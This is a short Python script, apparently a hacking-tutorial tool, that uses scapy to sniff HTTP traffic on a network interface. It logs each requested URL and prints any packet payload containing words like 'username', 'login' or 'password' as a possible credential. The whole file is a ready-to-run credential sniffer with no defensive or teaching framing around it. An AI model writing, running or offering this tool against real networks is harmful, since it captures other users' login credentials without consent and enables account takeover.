#!/usr/bin/python3
#python3   -m pip install SomePackage 
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if(packet.haslayer(scapy.Raw)):
            load = packet[scapy.Raw].load
            keywords = ["username","uname","login","password","pass","user"]
            for keyword in keywords:
                if keyword in str(load):
                    return load
                    
                    


def process_sniffed_packet(packet):
    if(packet.haslayer(http.HTTPRequest)):
        #print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >>" + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >" + str(login_info) + "\n\n")
        

sniff("eth0")   # your interface